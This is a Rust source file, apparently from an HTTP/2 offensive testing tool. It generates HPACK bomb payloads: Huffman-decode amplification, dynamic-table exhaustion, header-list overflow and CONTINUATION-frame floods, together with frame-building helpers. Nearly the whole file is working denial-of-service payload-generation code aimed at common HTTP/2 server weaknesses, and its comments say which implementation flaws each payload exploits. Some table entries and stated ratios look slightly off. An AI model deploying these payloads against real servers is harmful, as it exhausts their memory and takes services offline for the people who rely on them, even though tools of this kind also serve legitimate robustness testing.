use serde::{Deserialize, Serialize};

/// HTTP/2 frame type identifiers per RFC 7540 §6.
const FRAME_TYPE_HEADERS: u8 = 0x1;
const FRAME_TYPE_CONTINUATION: u8 = 0x9;

/// HTTP/2 frame flags.
const FLAG_END_HEADERS: u8 = 0x4;

/// HTTP/2 frame header length is always 9 bytes.
const FRAME_HEADER_LEN: usize = 9;

/// RFC 7541 §4.1: dynamic table entry overhead is 32 bytes.
const HPACK_ENTRY_OVERHEAD: usize = 32;

/// Configuration for HPACK bomb generation controlling expansion ratio and frame limits.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HpackBombConfig {
    pub target_expansion_ratio: u32,
    pub max_frame_size: usize,
    pub dynamic_table_size: usize,
}

impl Default for HpackBombConfig {
    fn default() -> Self {
        Self {
            target_expansion_ratio: 100,
            max_frame_size: 16_384,
            dynamic_table_size: 4096,
        }
    }
}

impl HpackBombConfig {
    pub fn with_target_expansion_ratio(mut self, ratio: u32) -> Self {
        self.target_expansion_ratio = ratio;
        self
    }

    pub fn with_max_frame_size(mut self, size: usize) -> Self {
        self.max_frame_size = size;
        self
    }

    pub fn with_dynamic_table_size(mut self, size: usize) -> Self {
        self.dynamic_table_size = size;
        self
    }
}

/// Result of generating an HPACK bomb payload.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HpackBombResult {
    pub compressed_size: usize,
    pub decompressed_size: usize,
    pub expansion_ratio: f64,
    pub frame_count: u32,
}

/// Entry in the HPACK dynamic table per RFC 7541 §4.1.
///
/// Size = 32 + name.len() + value.len() per the spec.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DynamicTableEntry {
    pub name: String,
    pub value: String,
    pub size: usize,
}

impl DynamicTableEntry {
    pub fn new(name: impl Into<String>, value: impl Into<String>) -> Self {
        let name = name.into();
        let value = value.into();
        let size = HPACK_ENTRY_OVERHEAD + name.len() + value.len();
        Self { name, value, size }
    }
}

/// A single CONTINUATION fragment for multi-frame header attacks.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ContinuationFragment {
    pub stream_id: u32,
    pub payload: Vec<u8>,
    pub is_final: bool,
}

/// Simplified subset of the RFC 7541 Appendix B Huffman table.
///
/// Maps ASCII bytes to (code, bit_length) pairs. Only covers printable
/// ASCII and a few control chars sufficient for attack payload generation.
const HUFFMAN_TABLE: [(u32, u8); 128] = [
    (0x1ff8, 13),
    (0x7fffd8, 23),
    (0xfffffe2, 28),
    (0xfffffe3, 28), // 0-3
    (0xfffffe4, 28),
    (0xfffffe5, 28),
    (0xfffffe6, 28),
    (0xfffffe7, 28), // 4-7
    (0xfffffe8, 28),
    (0xffffea, 24),
    (0x3ffffffc, 30),
    (0xfffffe9, 28), // 8-11
    (0xfffffea, 28),
    (0x3ffffffd, 30),
    (0xfffffeb, 28),
    (0xfffffec, 28), // 12-15
    (0xfffffed, 28),
    (0xfffffee, 28),
    (0xfffffef, 28),
    (0xffffff0, 28), // 16-19
    (0xffffff1, 28),
    (0xffffff2, 28),
    (0x3ffffffe, 30),
    (0xffffff3, 28), // 20-23
    (0xffffff4, 28),
    (0xffffff5, 28),
    (0xffffff6, 28),
    (0xffffff7, 28), // 24-27
    (0xffffff8, 28),
    (0xffffff9, 28),
    (0xffffffa, 28),
    (0xffffffb, 28), // 28-31
    (0x14, 6),
    (0x3f8, 10),
    (0x3f9, 10),
    (0xffa, 12), // 32-35 (space, !, ", #)
    (0x1ff9, 13),
    (0x15, 6),
    (0xf8, 8),
    (0x7fa, 11), // 36-39 ($, %, &, ')
    (0x3fa, 10),
    (0x3fb, 10),
    (0xf9, 8),
    (0x7fb, 11), // 40-43 ((, ), *, +)
    (0xfa, 8),
    (0x16, 6),
    (0x17, 6),
    (0x18, 6), // 44-47 (, -, ., /)
    (0x0, 5),
    (0x1, 5),
    (0x2, 5),
    (0x19, 6), // 48-51 (0, 1, 2, 3)
    (0x1a, 6),
    (0x1b, 6),
    (0x1c, 6),
    (0x1d, 6), // 52-55 (4, 5, 6, 7)
    (0x1e, 6),
    (0x1f, 6),
    (0x5c, 7),
    (0xfb, 8), // 56-59 (8, 9, :, ;)
    (0x7ffc, 15),
    (0x20, 6),
    (0xffb, 12),
    (0x3fc, 10), // 60-63 (<, =, >, ?)
    (0x1ffa, 13),
    (0x21, 6),
    (0x5d, 7),
    (0x5e, 7), // 64-67 (@, A, B, C)
    (0x5f, 7),
    (0x60, 7),
    (0x61, 7),
    (0x62, 7), // 68-71 (D, E, F, G)
    (0x63, 7),
    (0x64, 7),
    (0x65, 7),
    (0x66, 7), // 72-75 (H, I, J, K)
    (0x67, 7),
    (0x68, 7),
    (0x69, 7),
    (0x6a, 7), // 76-79 (L, M, N, O)
    (0x6b, 7),
    (0x6c, 7),
    (0x6d, 7),
    (0x6e, 7), // 80-83 (P, Q, R, S)
    (0x6f, 7),
    (0x70, 7),
    (0x71, 7),
    (0x72, 7), // 84-87 (T, U, V, W)
    (0xfc, 8),
    (0x73, 7),
    (0xfd, 8),
    (0x1ffb, 13), // 88-91 (X, Y, Z, [)
    (0x7fff0, 19),
    (0x1ffc, 13),
    (0x3ffc, 14),
    (0x22, 6), // 92-95 (\, ], ^, _)
    (0x7ffd, 15),
    (0x3, 5),
    (0x23, 6),
    (0x4, 5), // 96-99 (`, a, b, c)
    (0x24, 6),
    (0x5, 5),
    (0x25, 6),
    (0x26, 6), // 100-103 (d, e, f, g)
    (0x27, 6),
    (0x6, 5),
    (0x74, 7),
    (0x75, 7), // 104-107 (h, i, j, k)
    (0x28, 6),
    (0x29, 6),
    (0x2a, 6),
    (0x7, 5), // 108-111 (l, m, n, o)
    (0x2b, 6),
    (0x76, 7),
    (0x2c, 6),
    (0x8, 5), // 112-115 (p, q, r, s)
    (0x9, 5),
    (0x2d, 6),
    (0x77, 7),
    (0x78, 7), // 116-119 (t, u, v, w)
    (0x79, 7),
    (0x7a, 7),
    (0x7b, 7),
    (0x7ffc, 15), // 120-123 (x, y, z, {)
    (0x7ffd, 15),
    (0x3ffd, 14),
    (0x1fffd, 17),
    (0xffffffc, 28), // 124-127 (|, }, ~, DEL)
];

/// Extended HPACK bombing: Huffman-encoded bombs, dynamic table exhaustion,
/// header list overflow, and CONTINUATION-based fragmentation attacks.
///
/// Goes beyond basic HPACK bombing (in `h2_protocol_attacks`) by exploiting
/// specific HPACK codec implementation weaknesses: Huffman decode amplification,
/// dynamic table memory exhaustion, and header list size enforcement gaps.
pub struct HpackBombV2 {
    config: HpackBombConfig,
}

impl HpackBombV2 {
    pub fn new(config: HpackBombConfig) -> Self {
        Self { config }
    }

    /// Generate a Huffman-encoded header block that decompresses to `target_size_bytes`.
    ///
    /// Exploits the property that certain byte sequences (e.g. repeated '0')
    /// compress to 5 bits per character via Huffman, achieving ~1.6:1 compression
    /// on individual characters. By repeating short Huffman codes across a large
    /// header value, the compressed form expands dramatically on decode.
    pub fn generate_huffman_bomb(&self, target_size_bytes: usize) -> Vec<u8> {
        let repeat_char = b'0';
        let value = vec![repeat_char; target_size_bytes];
        let encoded_value = huffman_encode(&value);

        let name = b"x-bomb";
        let mut payload = Vec::new();
        payload.push(0x40);
        encode_hpack_string_raw(&mut payload, name);
        encode_hpack_string_huffman(&mut payload, &encoded_value, target_size_bytes);

        payload
    }

    /// Generate a sequence of header blocks that fill the HPACK dynamic table.
    ///
    /// Each block inserts a new entry with incremental indexing (0x40). Once
    /// the table is full, every new entry forces eviction processing, which
    /// in vulnerable implementations can cause O(n) scanning per insertion.
    pub fn generate_table_exhaustion(&self, table_size: usize) -> Vec<Vec<u8>> {
        let mut blocks = Vec::new();
        let mut consumed = 0usize;
        let mut index = 0u32;

        while consumed < table_size {
            let name = format!("x-fill-{:06}", index);
            let remaining = table_size.saturating_sub(consumed);
            let entry_overhead = HPACK_ENTRY_OVERHEAD + name.len();
            let value_len = if remaining > entry_overhead {
                (remaining - entry_overhead).min(512)
            } else {
                1
            };
            let value = "A".repeat(value_len);

            let mut block = Vec::new();
            block.push(0x40);
            encode_hpack_string_raw(&mut block, name.as_bytes());
            encode_hpack_string_raw(&mut block, value.as_bytes());

            let entry_size = HPACK_ENTRY_OVERHEAD + name.len() + value_len;
            consumed += entry_size;
            index += 1;
            blocks.push(block);
        }

        blocks
    }

    /// Generate a header block exceeding `max_size` bytes after decompression.
    ///
    /// Servers enforcing MAX_HEADER_LIST_SIZE should reject this, but
    /// implementations that decompress first and check size after are vulnerable
    /// to memory exhaustion.
    pub fn generate_header_list_overflow(&self, max_size: usize) -> Vec<u8> {
        let target = max_size + 1;
        let name = b"x-overflow";
        let value_len = target
            .saturating_sub(name.len() + HPACK_ENTRY_OVERHEAD)
            .max(1);
        let value = vec![b'B'; value_len];

        let mut payload = Vec::new();
        payload.push(0x40);
        encode_hpack_string_raw(&mut payload, name);
        encode_hpack_string_raw(&mut payload, &value);
        payload
    }

    /// Generate a CONTINUATION bomb: split a large header block across
    /// multiple CONTINUATION frames without END_HEADERS until the final one.
    ///
    /// Servers that buffer all fragments before processing can exhaust memory.
    /// The initial HEADERS frame has no END_HEADERS, followed by `fragments - 1`
    /// CONTINUATION frames, with only the last setting END_HEADERS.
    pub fn generate_continuation_bomb(&self, fragments: u32) -> Vec<Vec<u8>> {
        let fragments = fragments.max(1);
        let stream_id = 1u32;
        let chunk_size = self.config.max_frame_size.min(4096).max(64);

        let mut frames = Vec::with_capacity(fragments as usize);

        let header_payload = vec![0x80; chunk_size];
        frames.push(build_frame(
            FRAME_TYPE_HEADERS,
            0,
            stream_id,
            &header_payload,
        ));

        for i in 1..fragments {
            let continuation_payload = vec![0x80; chunk_size];
            let flags = if i == fragments - 1 {
                FLAG_END_HEADERS
            } else {
                0
            };
            frames.push(build_frame(
                FRAME_TYPE_CONTINUATION,
                flags,
                stream_id,
                &continuation_payload,
            ));
        }

        frames
    }

    /// Calculate the expansion ratio between compressed and decompressed sizes.
    pub fn calculate_expansion_ratio(&self, compressed: &[u8], decompressed_size: usize) -> f64 {
        if compressed.is_empty() {
            return 0.0;
        }
        decompressed_size as f64 / compressed.len() as f64
    }

    pub fn config(&self) -> &HpackBombConfig {
        &self.config
    }
}

/// Huffman-encode a byte sequence using the RFC 7541 Appendix B table.
fn huffman_encode(data: &[u8]) -> Vec<u8> {
    let mut output = Vec::new();
    let mut current_byte: u32 = 0;
    let mut bits_left: u8 = 0;

    for &byte in data {
        let idx = byte as usize;
        if idx >= HUFFMAN_TABLE.len() {
            continue;
        }
        let (code, code_len) = HUFFMAN_TABLE[idx];

        let mut remaining_bits = code_len;
        while remaining_bits > 0 {
            let shift = remaining_bits.saturating_sub(8 - bits_left);
            let bits_to_write = remaining_bits.min(8 - bits_left);
            let mask = if shift > 0 {
                (code >> shift) & ((1 << bits_to_write) - 1)
            } else {
                (code << (8 - bits_left - remaining_bits)) & 0xFF
            };
            current_byte |= (mask as u32) << (8 - bits_left - bits_to_write);
            bits_left += bits_to_write;
            remaining_bits -= bits_to_write;

            if bits_left == 8 {
                output.push(current_byte as u8);
                current_byte = 0;
                bits_left = 0;
            }
        }
    }

    if bits_left > 0 {
        let pad = 0xFFu32 >> bits_left;
        current_byte |= pad;
        output.push(current_byte as u8);
    }

    output
}

/// Encode an HPACK string literal without Huffman (H=0).
fn encode_hpack_string_raw(buf: &mut Vec<u8>, data: &[u8]) {
    if data.len() < 127 {
        buf.push(data.len() as u8);
    } else {
        buf.push(127);
        let mut remaining = data.len() - 127;
        while remaining >= 128 {
            buf.push(((remaining % 128) as u8) | 0x80);
            remaining /= 128;
        }
        buf.push(remaining as u8);
    }
    buf.extend_from_slice(data);
}

/// Encode an HPACK string literal with Huffman flag (H=1).
fn encode_hpack_string_huffman(buf: &mut Vec<u8>, encoded_data: &[u8], _original_len: usize) {
    let len = encoded_data.len();
    if len < 127 {
        buf.push(0x80 | (len as u8));
    } else {
        buf.push(0x80 | 127);
        let mut remaining = len - 127;
        while remaining >= 128 {
            buf.push(((remaining % 128) as u8) | 0x80);
            remaining /= 128;
        }
        buf.push(remaining as u8);
    }
    buf.extend_from_slice(encoded_data);
}

/// Build a complete HTTP/2 frame: 9-byte header + payload bytes.
fn build_frame(frame_type: u8, flags: u8, stream_id: u32, payload: &[u8]) -> Vec<u8> {
    let length = payload.len() as u32;
    let mut frame = Vec::with_capacity(FRAME_HEADER_LEN + payload.len());
    frame.push(((length >> 16) & 0xFF) as u8);
    frame.push(((length >> 8) & 0xFF) as u8);
    frame.push((length & 0xFF) as u8);
    frame.push(frame_type);
    frame.push(flags);
    let sid = stream_id & 0x7FFF_FFFF;
    frame.push(((sid >> 24) & 0xFF) as u8);
    frame.push(((sid >> 16) & 0xFF) as u8);
    frame.push(((sid >> 8) & 0xFF) as u8);
    frame.push((sid & 0xFF) as u8);
    frame.extend_from_slice(payload);
    frame
}

/// Parse frame type byte from a raw H2 frame.
pub fn parse_frame_type(frame: &[u8]) -> Option<u8> {
    if frame.len() < FRAME_HEADER_LEN {
        return None;
    }
    Some(frame[3])
}

/// Parse flags byte from a raw H2 frame.
pub fn parse_frame_flags(frame: &[u8]) -> Option<u8> {
    if frame.len() < FRAME_HEADER_LEN {
        return None;
    }
    Some(frame[4])
}

/// Parse stream ID from a raw H2 frame.
pub fn parse_stream_id(frame: &[u8]) -> Option<u32> {
    if frame.len() < FRAME_HEADER_LEN {
        return None;
    }
    let sid = ((frame[5] as u32) << 24)
        | ((frame[6] as u32) << 16)
        | ((frame[7] as u32) << 8)
        | (frame[8] as u32);
    Some(sid & 0x7FFF_FFFF)
}

/// Parse declared payload length from a raw H2 frame header.
pub fn parse_payload_length(frame: &[u8]) -> Option<usize> {
    if frame.len() < FRAME_HEADER_LEN {
        return None;
    }
    let len = ((frame[0] as usize) << 16) | ((frame[1] as usize) << 8) | (frame[2] as usize);
    Some(len)
}

/// Validate that a frame has a structurally valid H2 frame header.
pub fn validate_frame_header(frame: &[u8]) -> bool {
    if frame.len() < FRAME_HEADER_LEN {
        return false;
    }
    let declared_len =
        ((frame[0] as usize) << 16) | ((frame[1] as usize) << 8) | (frame[2] as usize);
    frame.len() == FRAME_HEADER_LEN + declared_len
}
